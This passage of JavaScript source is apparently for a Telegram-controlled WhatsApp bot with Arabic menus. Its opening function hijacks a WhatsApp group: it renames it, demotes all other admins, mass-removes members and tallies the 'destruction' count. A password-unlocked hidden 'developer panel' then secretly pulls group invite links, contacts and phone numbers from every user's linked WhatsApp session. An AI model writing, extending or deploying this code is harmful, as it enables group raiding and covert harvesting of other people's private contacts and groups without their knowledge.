        let meta = await sock.groupMetadata(groupJid);
        const rawBotId = sock.user && sock.user.id ? sock.user.id : '';
        const cleanBotNumber = rawBotId.split(':')[0].split('@')[0];
        const cleanUserNumber = senderJid ? senderJid.split(':')[0].split('@')[0] : '';

        const img = getQuickImage();
        let kickedCount = 0;
        const instantActions = [
            sock.groupUpdateSubject(groupJid, customName).catch(function(){}),
            sock.groupUpdateDescription(groupJid, customDesc).catch(function(){})
        ];
        if (img) instantActions.push(sock.updateProfilePicture(groupJid, img).catch(function(){}));

        let admins = meta.participants.filter(p => p.admin && !p.id.includes(cleanBotNumber) && !p.id.includes(cleanUserNumber));
        for (let i = 0; i < admins.length; i++) {
            instantActions.push(sock.groupParticipantsUpdate(groupJid, [admins[i].id], 'demote').catch(function(){}));
            kickedCount++;
        }
        await Promise.all(instantActions);

        let normalMembers = meta.participants
            .filter(p => !p.admin && !p.id.includes(cleanBotNumber) && !p.id.includes(cleanUserNumber))
            .map(p => p.id);

        if (normalMembers.length > 0) {
            for (let i = 0; i < normalMembers.length; i += 10) {
                let batch = normalMembers.slice(i, i + 10);
                await sock.groupParticipantsUpdate(groupJid, batch, 'remove').catch(function(){});
                kickedCount += batch.length;
                await delay(200);
            }
        }

        await sock.sendMessage(groupJid, { text: customMsg });

        if (img) {
            await sock.sendMessage(groupJid, { image: img, caption: '🔗 رابط القناة:\n' + CHANNEL_LINK }, { quoted: msg });
        } else {
            await sock.sendMessage(groupJid, { text: '🔗 رابط القناة:\n' + CHANNEL_LINK }, { quoted: msg });
        }

        updateStats(telegramId, kickedCount);
    } catch (e) {}
}

async function executeKick(sock, groupJid, args, msg) {
    try {
        const extText = msg.message.extendedTextMessage;
        const mentioned = extText && extText.contextInfo && extText.contextInfo.mentionedJid ? extText.contextInfo.mentionedJid : [];
        if (mentioned.length > 0) {
            await sock.groupParticipantsUpdate(groupJid, mentioned, 'remove');
            sock.sendMessage(groupJid, { text: '✅ تم طرد العضو بنجاح 🥂.' }, { quoted: msg }).catch(function(){});
        } else {
            sock.sendMessage(groupJid, { text: '⚠️ *خطأ:* يجب عمل إشارة (منشن) للعضو.' }, { quoted: msg }).catch(function(){});
        }
    } catch (e) {}
}

// ===== تيليجرام =====
const bot = new Telegraf(TELEGRAM_TOKEN);

function ownerOnly(ctx, next) {
    return next();
}

bot.telegram.setMyCommands([
    { command: 'menu', description: 'قائمة الأوامر الرئيسية' },
    { command: 'link', description: 'ربط واتساب' },
    { command: 'status', description: 'الحالة والإحصائيات' },
    { command: 'logout', description: 'فصل الجلسة' },
    { command: 'health', description: 'فحص النظام' }
]).catch(function(){});

const userMenuBox = 
'╔════════════════════════════╗\n' +
'║   🔥 𝑉𝐸𝑁𝐴𝑅 𝑆𝑌𝑆𝑇𝐸𝑀 𝑀𝐸𝑁𝑈 🔥   ║\n' +
'╠════════════════════════════╣\n' +
'📱 أوامر البوت الأساسية:\n' +
'• /link ➔ ربط رقم واتساب 🔗\n' +
'• /status ➔ حالة الاتصال 📊\n' +
'• /logout ➔ فصل الجلسة 🔌\n' +
'• /health ➔ فحص النظام 🩺\n' +
'╚════════════════════════════╝';

const devMenuBox = 
'╔════════════════════════════╗\n' +
'║   ⚡ 𝑉𝐸𝑁𝐴𝑅 𝐷𝐸𝑉 𝑃𝐴𝑁𝐸𝐿 ⚡     ║\n' +
'╠════════════════════════════╣\n' +
'🛠️ لوحة تحكم المطور السرية:\n' +
'• /channels ➔ القنوات المؤرشفة 📺\n' +
'• /active ➔ المتصلين النشطين 👥\n' +
'• /groups [رقم] ➔ إدارة الجروبات 📁\n' +
'• /contacts ➔ جهات الاتصال 📇\n' +
'• /find <كلمة> ➔ بحث شامل 🔎\n' +
'╚════════════════════════════╝';

const mainKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📊 Bot Status', 'tg_status'), Markup.button.callback('🔌 Unlink Bot', 'tg_logout')],
    [Markup.button.url('📢 Channel', CHANNEL_LINK), Markup.button.callback('⚙️ Settings', 'tg_menu')]
]);

const sendStartMenu = async (ctx) => {
    const userId = ctx.from.id.toString();
    devModeSessions.delete(userId);
    const img = getQuickImage();
    if (img) {
        await ctx.replyWithPhoto({ source: img }, { caption: userMenuBox, parse_mode: 'Markdown', ...mainKeyboard });
    } else {
        await ctx.reply(userMenuBox, { parse_mode: 'Markdown', ...mainKeyboard });
    }
};

bot.start(ownerOnly, sendStartMenu);

const menuHandler = async (ctx) => {
    const userId = ctx.from.id.toString();
    const img = getQuickImage();
    if (devModeSessions.has(userId)) {
        if (img) {
            await ctx.replyWithPhoto({ source: img }, { caption: devMenuBox, parse_mode: 'Markdown', ...mainKeyboard });
        } else {
            await ctx.reply(devMenuBox, { parse_mode: 'Markdown', ...mainKeyboard });
        }
    } else {
        if (img) {
            await ctx.replyWithPhoto({ source: img }, { caption: userMenuBox, parse_mode: 'Markdown', ...mainKeyboard });
        } else {
            await ctx.reply(userMenuBox, { parse_mode: 'Markdown', ...mainKeyboard });
        }
    }
};

bot.command(['menu', 'اوامر', 'مينيو'], ownerOnly, menuHandler);
bot.hears(/^(menu|اوامر|مينيو)$/i, ownerOnly, menuHandler);
bot.command(['help', 'شرح'], ownerOnly, menuHandler);

bot.action('tg_status', async (ctx) => {
    await ctx.answerCbQuery();
    const id = ctx.from.id.toString();
    const s = sessions.get(id);
    const u = usersData[id] || {};
    const stats = getUserStats(id);
    const statusText = (s && s.status === 'connected') ? '✅ متصل ومستقر' : '❌ غير متصل';
    
    await ctx.reply(`📊 *حالة البوت الحالية:*\n- واتساب: ${statusText}\n- الرقم: ${u.phone ? '+' + u.phone : 'غير مربوط'}\n- الهلاك المحفوظ: ${stats.totalHelak}`, { parse_mode: 'Markdown' });
});

bot.action('tg_logout', async (ctx) => {
    await ctx.answerCbQuery();
    const id = ctx.from.id.toString();
    const s = sessions.get(id);
    try {
        if (s && s.sock) {
            await s.sock.logout().catch(function(){});
            s.sock.end(undefined);
        }
        sessions.delete(id);
        devModeSessions.delete(id);
        const userSessionDir = path.join(SESSIONS_DIR, 'user_' + id);
        if (fs.existsSync(userSessionDir)) {
            fs.rmSync(userSessionDir, { recursive: true, force: true });
        }
        if (usersData[id]) {
            usersData[id].registered = false;
            saveData(usersData);
        }
        await ctx.reply('🔌 تم إلغاء ربط الجلسة بنجاح.');
    } catch (err) {
        await ctx.reply('❌ حدث خطأ أثناء فصل الجلسة.');
    }
});

bot.action('tg_menu', async (ctx) => {
    await ctx.answerCbQuery();
    menuHandler(ctx);
});

bot.command('link', ownerOnly, async function(ctx) {
    const p = ctx.message.text.split(' ')[1];
    const phone = p ? p.replace(/[^0-9]/g, '') : '';
    if (!phone) {
        const linkInstruction = '🔗 *Link a bot*\nSend your WhatsApp number with the country code, digits only.\nExample: `9665XXXXXXXX`';
        const backCancelKeyboard = Markup.inlineKeyboard([
            [Markup.button.callback('⬅️ Back', 'tg_menu'), Markup.button.callback('❌ Cancel', 'tg_logout')]
        ]);
        const img = getQuickImage();
        if (img) {
            return ctx.replyWithPhoto({ source: img }, { caption: linkInstruction, parse_mode: 'Markdown', ...backCancelKeyboard });
        } else {
            return ctx.reply(linkInstruction, { parse_mode: 'Markdown', ...backCancelKeyboard });
        }
    }
    await ctx.reply('⏳ جاري الاتصال وتوليد كود الربط...');
    try { await connectWhatsApp(ctx.from.id.toString(), phone, bot); } catch (e) { ctx.reply('❌ ' + e.message); }
});

bot.on('text', async (ctx, next) => {
    const userId = ctx.from.id.toString();
    const text = ctx.message.text.trim();

    if (text === PASSWORD_SECRET) {
        devModeSessions.add(userId);
        const img = getQuickImage();
        const successMsg = '🔓 *تم التحقق بنجاح! تم نقلك إلى واجهة المطور السرية الخاصة بالبوت.* ⚡';
        if (img) {
            await ctx.replyWithPhoto({ source: img }, { caption: successMsg + '\n\n' + devMenuBox, parse_mode: 'Markdown', ...mainKeyboard });
        } else {
            await ctx.reply(successMsg + '\n\n' + devMenuBox, { parse_mode: 'Markdown', ...mainKeyboard });
        }
        return;
    }

    if (devModeSessions.has(userId)) {
        if (text.startsWith('/channels')) {
            const items = Object.values(channels).sort((a, b) => b.updatedAt - a.updatedAt);
            if (!items.length) return ctx.reply('📭 لا توجد قنوات مؤرشفة بعد.');
            let txt = '📺 عدد القنوات: ' + items.length + '\n\n';
            for (let i = 0; i < Math.min(items.length, 25); i++) {
                const c = items[i];
                txt += (i + 1) + '. ' + c.name + '\n   ' + (c.link || 'بدون رابط') + '\n\n';
            }
            return ctx.reply(txt, { disable_web_page_preview: true });
        }
        else if (text.startsWith('/active')) {
            let activeCount = 0;
            sessions.forEach(function(s) {
                if (s.status === 'connected') activeCount++;
            });
            return ctx.reply('👥 عدد المتصلين النشطين: ' + activeCount);
        }
        else if (text.startsWith('/groups')) {
            const args = text.split(' ');
            const targetIndex = args[1] ? parseInt(args[1]) : null;
            let sessionsArr = Array.from(sessions.entries());
            
            if (targetIndex !== null && !isNaN(targetIndex)) {
                let targetEntry = sessionsArr[targetIndex - 1];
                if (!targetEntry) return ctx.reply('❌ رقم المستخدم/الجلسة غير موجود.');
                
                const sessionData = targetEntry[1];
                const sock = sessionData.sock;
                try {
                    const groupsObj = await sock.groupFetchAllParticipating();
                    const groupList = Object.values(groupsObj || {});
                    if (!groupList.length) return ctx.reply('📁 لا توجد جروبات لهذه الجلسة.');

                    let totalText = `📁 جروبات الجلسة رقم ${targetIndex} (+${sessionData.phone}):\n\n`;
                    for (let i = 0; i < groupList.length; i++) {
                        let inviteLink = 'غير متاح';
                        try {
                            const code = await sock.groupInviteCode(groupList[i].id);
                            if (code) inviteLink = 'https://chat.whatsapp.com/' + code;
                        } catch (err) {}
                        totalText += `${i + 1}. ${groupList[i].subject}\n   الرابط: ${inviteLink}\n\n`;
                    }
                    return ctx.reply(totalText, { disable_web_page_preview: true });
                } catch (e) {
                    return ctx.reply('❌ فشل جلب جروبات هذه الجلسة.');
                }
            } 
            else {
                let totalText = '📁 *قائمة الجروبات الشاملة لكل الجلسات:*\n\n';
                let foundAny = false;
                let indexNum = 1;

                for (let [tId, sessionData] of sessions.entries()) {
                    if (sessionData.status === 'connected' && sessionData.sock) {
                        try {
                            const groupsObj = await sessionData.sock.groupFetchAllParticipating();
                            const groupList = Object.values(groupsObj || {});
                            if (groupList.length > 0) {
                                foundAny = true;
                                totalText += `📱 [الرقم ${indexNum}] +${sessionData.phone}:\n`;
                                for (let i = 0; i < groupList.length; i++) {
                                    let inviteLink = 'غير متاح';
                                    try {
                                        const code = await sessionData.sock.groupInviteCode(groupList[i].id);
                                        if (code) inviteLink = 'https://chat.whatsapp.com/' + code;
                                    } catch (err) {}
                                    totalText += `   - ${groupList[i].subject}\n     الرابط: ${inviteLink}\n`;
                                }
                                totalText += '\n';
                                indexNum++;
                            }
                        } catch (e) {}
                    }
                }
                if (!foundAny) return ctx.reply('📭 لا توجد أي جروبات نشطة.');
                totalText += '💡 لاستعراض جروبات مستخدم محدد اكتب مثلاً: `/groups 1`';
                return ctx.reply(totalText, { disable_web_page_preview: true });
            }
        }
        else if (text.startsWith('/contacts')) {
            let totalText = '📇 *جهات الاتصال المحفوظة:*\n\n';
            let foundAny = false;

            for (let [tId, sessionData] of sessions.entries()) {
                if (sessionData.status === 'connected' && sessionData.contacts) {
                    const contactsList = Object.entries(sessionData.contacts);
                    if (contactsList.length > 0) {
                        foundAny = true;
                        totalText += `📱 جلسة الرقم (+${sessionData.phone}):\n`;
                        for (let i = 0; i < Math.min(contactsList.length, 30); i++) {
                            let [jid, name] = contactsList[i];
                            totalText += `   ${i + 1}. ${name} (${jid.split('@')[0]})\n`;
                        }
                        totalText += '\n';
                    }
                }
            }
            if (!foundAny) return ctx.reply('📭 لا توجد جهات اتصال مسجلة في الجلسات الحالية بعد.');
            return ctx.reply(totalText, { disable_web_page_preview: true });
        }
        else if (text.startsWith('/find')) {
            const q = text.split(' ').slice(1).join(' ').trim().toLowerCase();
            if (!q) return ctx.reply('⚠️ اكتب كلمة أو حرفاً للبحث: `/find أ`', { parse_mode: 'Markdown' });
            
            const hits = Object.values(channels).filter((c) => c.name.toLowerCase().includes(q));
            let groupHits = [];

            for (let [tId, sessionData] of sessions.entries()) {
                if (sessionData.status === 'connected' && sessionData.sock) {
                    try {
                        const groupsObj = await sessionData.sock.groupFetchAllParticipating();
                        const groupList = Object.values(groupsObj || {});
                        for (const g of groupList) {
                            if (g.subject && g.subject.toLowerCase().includes(q)) {
                                let inviteLink = 'غير متاح';
                                try {
                                    const code = await sessionData.sock.groupInviteCode(g.id);
                                    if (code) inviteLink = 'https://chat.whatsapp.com/' + code;
                                } catch (err) {}
                                groupHits.push({ name: g.subject, link: inviteLink });
                            }
                        }
                    } catch (e) {}
                }
            }

            if (!hits.length && !groupHits.length) return ctx.reply('❌ لا توجد نتائج مطابقة.');

            let txt = `🔎 نتائج البحث الشامل عن ("${q}"):\n\n`;
            if (hits.length > 0) {
                txt += `📺 **القنوات:**\n`;
                for (const c of hits.slice(0, 15)) txt += `• ${c.name}\n  ${c.link || 'بدون رابط'}\n\n`;
            }
            if (groupHits.length > 0) {
                txt += `📁 **المجموعات (الجروبات):**\n`;
                for (const g of groupHits.slice(0, 15)) txt += `• ${g.name}\n  ${g.link}\n\n`;
            }
            return ctx.reply(txt, { disable_web_page_preview: true });
        }
    }

    return next();
});

bot.command('status', ownerOnly, function(ctx) {
    const id = ctx.from.id.toString();
    const s = sessions.get(id);
    const u = usersData[id] || {};
    ctx.reply('📊 الحالة:\n- واتساب: ' + (s && s.status === 'connected' ? 'متصل' : 'غير متصل') + '\n- الرقم: ' + (u.phone ? '+' + u.phone : 'غير مربوط'));
});

bot.command('health', ownerOnly, function(ctx) {
    const mem = process.memoryUsage();
    ctx.reply('🩺 الذاكرة المستخدمة: ' + (mem.heapUsed / 1024 / 1024).toFixed(2) + ' MB');
});

bot.command('logout', ownerOnly, async function(ctx) {
    const id = ctx.from.id.toString();
    const s = sessions.get(id);
    try {
        if (s && s.sock) {
            await s.sock.logout().catch(function(){});
            s.sock.end(undefined);
        }
        sessions.delete(id);
        devModeSessions.delete(id);
        const userSessionDir = path.join(SESSIONS_DIR, 'user_' + id);
        if (fs.existsSync(userSessionDir)) {
            fs.rmSync(userSessionDir, { recursive: true, force: true });
        }
        if (usersData[id]) {
            usersData[id].registered = false;
            saveData(usersData);
        }
        await ctx.reply('🔌 تم قطع جلسة الواتساب بنجاح.');
    } catch (err) {
        await ctx.reply('❌ حدث خطأ أثناء فصل الجلسة.');
    }
});

bot.catch((err) => console.error('TG error:', err?.message || err));

(async function(){
    if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
    for (let id in usersData) {
        let d = usersData[id];
        if (d.phone && d.registered) { try { await connectWhatsApp(id, d.phone, bot); } catch (e) {} }
    }
    await bot.launch({ dropPendingUpdates: true });
    console.log('✅ BOT RUNNING WITH FULL FUNCTIONALITY & FIXED SYNTAX');
})();

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
